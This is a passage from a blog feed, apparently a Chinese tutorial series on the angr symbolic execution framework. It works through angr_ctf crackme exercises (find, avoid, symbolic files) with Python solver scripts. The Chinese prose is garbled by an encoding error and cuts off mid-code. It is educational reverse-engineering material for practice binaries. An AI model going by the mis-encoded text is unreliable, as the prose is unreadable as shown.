angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>  content<span class="token operator">=</span>password<span class="token punctuation">,</span>size<span class="token operator">=</span>symbolic_file_size_bytes<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>password_file<span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'Good Job.'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> stdout_output  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'Try again.'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> stdout_output  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€åæ±‚å¾—å¯†ç ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220502122600085.png" alt="image-20220502122600085"></p>]]></content>
      
      
      
        <tags>
            
            <tag> symbolic execution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angrå…¥é—¨(ä¸€)</title>
      <link href="/2022/04/26/angr-ru-men/"/>
      <url>/2022/04/26/angr-ru-men/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰ä¸€ç›´æƒ³å­¦ä¹ ä¸€ä¸‹ angr ç¬¦å·æ‰§è¡Œï¼Œåœ¨ CTF é¢˜ç›®ä¸­è™½ç„¶æ¥è§¦è¿‡å¾ˆå¤šæ¬¡ï¼Œä¹Ÿç”¨è¿‡é‚£ä¹ˆä¸€ä¸¤æ¬¡ï¼Œä½†éƒ½æ˜¯ç”¨çš„åˆ«äººçš„ä»£ç ï¼Œå®Œå…¨ä¸ç†è§£å…¶ä¸­çš„è¿è¡Œæœºåˆ¶ï¼Œè„šæœ¬ä¹Ÿæ˜¯ä¸çŸ¥å…¶ä¹‰ï¼Œè¿˜åŸ‹æ€¨ angr ä¸å¥½ç”¨ã€‚åœ¨é‡æ–°è¯»äº†ä¸€éå®˜æ–¹æ–‡æ¡£åæ‰çŸ¥é“ angr å…¶å®å¾ˆå¼ºå¤§ï¼Œå¯ä»¥åªæ‰§è¡Œè‡ªå·±æƒ³è¦æ‰§è¡Œçš„å‡½æ•°è€Œä¸ç”¨æ‰§è¡Œæ•´ä¸ªç¨‹åºã€‚æ­£å¥½æœ€è¿‘çœ‹åˆ°ä¸€ä¸ªå¼€æºé¡¹ç›®ç”¨äºç»ƒä¹  angrï¼Œé‚£å°±ä»0å¼€å§‹å½»åº•æŠŠ angr å­¦ä¹ ä¸€ä¸‹ï¼Œå¯¹ Fuzz å·¥ä½œä¹Ÿæ˜¯å¾ˆæœ‰å¸®åŠ©çš„ã€‚</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>é¦–å…ˆä»‹ç»ä¸€ä¸‹ angr å§ã€‚å®ƒæ˜¯ä¸€ä¸ªç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶åˆ†æçš„ Python æ¡†æ¶ï¼Œç»“åˆäº†é™æ€åˆ†æå’ŒåŠ¨æ€ç¬¦å·çš„åˆ†æã€‚angr å­¦ä¹ çš„è·¯çº¿æ¯”è¾ƒé™¡å³­ï¼Œä¸æ˜¯è¯´å®ƒæœ‰å¤šéš¾ï¼Œè€Œæ˜¯æ²¡æœ‰åˆé€‚çš„å­¦ä¹ èµ„æ–™å’Œè¿è´¯çš„å­¦ä¹ è·¯å¾„ã€‚è¿™é‡Œæˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªå¼€æºé¡¹ç›® <a href="https://github.com/jakespringer/angr_ctf">angr_ctf</a>ï¼Œå®ƒä»0å¼€å§‹ä¸€æ­¥ä¸€æ­¥æ•™æˆ‘ä»¬ä½¿ç”¨ angr çš„åŠŸèƒ½ã€‚</p><p>ç¬¦å·æ‰§è¡Œçš„æ„ä¹‰å°±æ˜¯åœ¨ä¸å®é™…è¿è¡Œç¨‹åºçš„æƒ…å†µä¸‹å¯¹ç¨‹åºè¿›è¡Œåˆ†æï¼Œä»¥äº†è§£åœ¨ä»€ä¹ˆçŠ¶æ€ä¸‹ï¼Œæ‰§è¡Œäº†å“ªæ¡è·¯å¾„çš„ä»£ç ã€‚ä¸¾ä¸€ä¸ªæœ€å¸¸è§çš„ä¾‹å­ï¼ŒCTF ä¸­çš„é€†å‘é¢˜ç›®ï¼Œé€šå¸¸æ˜¯çŸ¥é“ç¨‹åºçš„è¾“å‡ºç»“æœï¼Œè¦æˆ‘ä»¬å»é€†å‘åŠ å¯†ç®—æ³•ï¼Œå¾—åˆ°æˆ‘ä»¬åº”è¯¥è¾“å…¥çš„æ­£ç¡®å†…å®¹ï¼Œä¹Ÿå°±æ˜¯ flagã€‚</p><p>ç¬¦å·æ‰§è¡Œå°±å…è®¸æˆ‘ä»¬æŠŠç¨‹åºå½“ä½œä¸€ä¸ªæ–¹ç¨‹æ¥æ±‚è§£ï¼Œå°±åƒæ˜¯æ–¹ç¨‹å¼ä¸­çš„ Xã€Y ç­‰ç¬¦å·ï¼Œè€Œç¨‹åºæ‰§è¡Œçš„è·¯å¾„ç”¨äºâ€œçº¦æŸâ€ç¬¦å·ã€‚ä¸¾ä¸ªä¾‹å­ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> x<span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Fail."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ä¸Šé¢çš„ä»£ç é‡Œï¼Œ<code>if</code> è¯­å¥äº§ç”Ÿä¸¤æ¡è·¯å¾„ï¼Œè¦ä¹ˆæ‰“å°â€Success!!â€ï¼Œè¦ä¹ˆæ‰“å°â€Failâ€ï¼Œå…¶å®å°±æ˜¯ <code>if</code> è¯­å¥å¯¹ç¬¦å· <code>x</code> çš„çº¦æŸã€‚å‡è®¾ç°åœ¨æˆ‘ä»¬å¯¹ â€œSuccess!!â€è¿™æ¡è·¯å¾„æ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œé‚£ä¹ˆå°±å¿…é¡»æ»¡è¶³ <code>1 &lt; x &lt; 10</code>ï¼Œè¿™ä¸ªå…¬å¼å°±æ˜¯ç¬¦å·æ‰§è¡Œä¸­çš„çº¦æŸï¼Œç¬¦å·æ‰§è¡Œå¼•æ“å°†æ­¤è¯­å¥æ³¨å…¥ä¸€ä¸ªç¬¦å·æ ‡è¯†ï¼Œç»§ç»­å‘åè¿è¡Œä»¥æ‰¾åˆ°ç¬¦åˆçº¦æŸçš„å€¼ã€‚</p><p>ä¸Šé¢çš„ç¨‹åºæ¯”è¾ƒç®€å•ï¼Œå› ä¸ºå®ƒåªæœ‰ä¸¤æ¡è·¯å¾„ï¼Œå¾ˆå®¹æ˜“å°±å¯ä»¥æ±‚è§£ã€‚å½“é‡åˆ°ç‰¹åˆ«å¤§çš„ç¨‹åºæ—¶ä¼šæœ‰å¾ˆå¤šè·¯å¾„ï¼Œæ­¤æ—¶å°±ä¼šé‡åˆ°â€œè·¯å¾„çˆ†ç‚¸â€çš„é—®é¢˜ï¼Œå› ä¸ºæ¯æ¡è·¯å¾„å‘ä¸‹æ‰§è¡Œæ—¶ï¼Œè·¯å¾„éƒ½æ˜¯å‘ˆæŒ‡æ•°å¢é•¿çš„ï¼Œç›¸å¯¹äºæ±‚è§£çš„æ—¶é—´å°±æ¯”è¾ƒé•¿äº†ï¼Œå¯èƒ½åˆ° <a href="https://zh.wikipedia.org/wiki/%E7%83%AD%E5%AF%82">çƒ­å¯‚</a> éƒ½æ— æ³•æ±‚è§£å‡ºæ¥ã€‚</p><h1 id="Part-0-angr-find"><a href="#Part-0-angr-find" class="headerlink" title="Part 0 angr find"></a>Part 0 angr find</h1><p>è¿›å…¥æ­£é¢˜ï¼Œé¦–å…ˆæŠŠ angr_ctf å…‹éš†ä¸‹æ¥ï¼Œè¿›å…¥åˆ° dist&#x2F; æ–‡ä»¶å¤¹ä¸‹ï¼Œè¿™é‡Œå¯ä»¥æ‰¾åˆ°è®¸å¤šç»ƒä¹ é¢˜ç›®å’Œä¸€å † xx.py çš„æ–‡ä»¶ã€‚æ‰¾åˆ° 00_angr_find çš„æ–‡ä»¶ï¼Œè¿™æ˜¯ç¬¬ä¸€ä¸ªé¢˜ç›®ï¼Œé€»è¾‘ç›¸å½“ç®€å•ï¼Œè¦æ±‚è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç¨‹åºå¯¹å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†åè¦å’Œâ€œJACEJGCSâ€ç›¸åŒï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220426233408003.png" alt="image-20220426233408003"></p><p>é€šå¸¸æƒ…å†µä¸‹éœ€è¦å¯¹ <code>complex_function</code> å‡½æ•°è¿›è¡Œæ‰‹åŠ¨é€†å‘ï¼Œç°åœ¨ç›´æ¥ç”¨ angr çº¦æŸæ±‚è§£ï¼Œå¾—åˆ°åº”è¯¥è¾“å…¥çš„æ­£ç¡®å­—ç¬¦ä¸²ã€‚æ¥ä¸‹æ¥æŸ¥çœ‹è§£é¢˜ä»£ç  scaffold00.py ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> ???  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    print_good_address <span class="token operator">=</span> ???  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç°åœ¨é€è¡Œåˆ†æï¼Œé¦–å…ˆå¯¼å…¥äº† angr åº“å’Œ sys åº“ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åçœ‹ <code>main</code> å‡½æ•°çš„å†…å®¹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> ???  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>path_to_binary</code> æŒ‡å®šå¯æ‰§è¡Œç¨‹åºè·¯å¾„</li><li><code>angr.Project()</code> åˆ›å»ºä¸€ä¸ª <code>Project</code> å®ä¾‹</li><li><code>project.factory.entry_state()</code> åœ¨ç¨‹åºå…¥å£ç‚¹åˆ›å»ºç¨‹åºçŠ¶æ€ï¼Œç±»ä¼¼äºä¸€ä¸ªå¿«ç…§</li><li><code>project.factory.simgr()</code> å‘Šè¯‰ç¬¦å·æ‰§è¡Œå¼•æ“ä» <code>initial_state</code> å¤„å¼€å§‹ç¬¦å·æ‰§è¡Œ</li></ul><p>æ¥ä¸‹æ¥çš„ä¸¤è¡Œä»£ç æ˜¯å…³é”®ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">print_good_address <span class="token operator">=</span> ???simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p><code>print_good_address</code> æ˜¯æ‰“å°â€Good Jobâ€çš„åœ°å€</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220426235759712.png" alt="image-20220426235759712"></p></li><li><p><code>simulation.explore()</code> å‘Šè¯‰ç¬¦å·æ‰§è¡Œå¼•æ“ï¼Œæˆ‘ä»¬æƒ³è¦åˆ°è¾¾çš„ä»£ç ä½ç½®</p></li></ul><p>æœ€åå‡ è¡Œä»£ç ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‹¥ç¬¦å·æ‰§è¡Œå¼•æ“æ‰¾åˆ°æ­£ç¡®è·¯å¾„ï¼Œå°†è¾“å…¥ç»™ <code>stdin</code>ï¼Œå¦åˆ™æŠ›å¼‚å¸¸ã€‚</p><p>ä¿®æ”¹æ•´ä½“ä»£ç ï¼Œå¾—åˆ°å®Œæ•´ä»£ç ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./00_angr_find"</span> <span class="token comment"># path of the binary program</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  print_good_address <span class="token operator">=</span> <span class="token number">0x8048678</span>  <span class="token comment"># :integer (probably in hexadecimal)</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success! Solution is: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€åæ‰§è¡Œ scaffold00.py å¾—åˆ°éœ€è¦è¾“å…¥çš„å­—ç¬¦ä¸²â€JXWVXRKXâ€ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427000053246.png" alt="image-20220427000053246"></p><h1 id="Part-1-angr-find-condition"><a href="#Part-1-angr-find-condition" class="headerlink" title="Part 1 angr find condition"></a>Part 1 angr find condition</h1><p>åœ¨ä¸Šé¢ç®€å•çš„è®¤è¯†äº†ä¸€ä¸‹ angrï¼Œæ¥ä¸‹æ¥å­¦ä¹ å¦‚ä½•é¿å…ä¸éœ€è¦çš„çŠ¶æ€ä»¥å‡å°‘ç¬¦å·æ‰§è¡Œçš„æ—¶é—´ã€‚å…ˆè·³è¿‡ 01_angr_avoidï¼Œå› ä¸ºå®ƒå’Œä¸Šé¢çš„é¢˜ç›®æ˜¯ä¸€æ ·çš„ï¼Œä½†éœ€è¦æˆ‘ä»¬æŒ‡å®šå’Œé¿å…æŸäº›è·¯å¾„ï¼Œå¯ä»¥å€Ÿ 02_angr_find_condition æ¥å­¦ä¹  angr çš„ avoid åŠŸèƒ½ã€‚ç”¨ IDA æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯ä»¥å‘ç°æœ‰å¾ˆå¤šå—éƒ½ä¼šæ‰“å°â€œGood Jobâ€æˆ–â€œTry againâ€ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427105401322.png" alt="image-20220427105401322"></p><p>è®°å½•æ‰€æœ‰çš„è¿™äº›å—èµ·å§‹åœ°å€ä¸å¤ªç°å®ï¼Œæ•°é‡å¤ªå¤šäº†ï¼Œä½†å¯ä»¥æ ¹æ®å®ƒæ‰“å°åˆ°æ ‡å‡†è¾“å‡ºçš„å†…å®¹å‘Šè¯‰ angr ä¿ç•™æˆ–ä¸¢å¼ƒã€‚æ‰“å¼€ scaffold02.py æ–‡ä»¶ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  <span class="token comment"># :boolean</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  <span class="token comment"># :boolean</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»£ç å¤§éƒ¨åˆ†éƒ½å’Œå‰ä¸€ä¸ªä¾‹å­ç›¸åŒï¼Œå°±ä¸èµ˜è¿°äº†ã€‚ä¸»è¦çœ‹ä¸­é—´éƒ¨åˆ†ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>   stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> ???  <span class="token comment"># :boolean</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>   stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> ???  <span class="token comment"># :boolean</span> simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çŒœæµ‹ <code>is_successful()</code> å¯¹çŠ¶æ€è¿›è¡Œæ£€æµ‹ï¼Œæ£€æµ‹å®ƒçš„ç»“æœæ˜¯å¦è¾“å‡º â€œGood Jobâ€ã€‚æ ¹æ®åˆ†æä¿®æ”¹ä»£ç ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>     <span class="token keyword">return</span> <span class="token boolean">True</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå†ä¿®æ”¹ <code>should_abort()</code> å‡½æ•°ï¼Œå¯ä»¥çœ‹å‡ºæ¥å’Œ <code>is_successful()</code> åŠŸèƒ½ç›¸åŒï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token 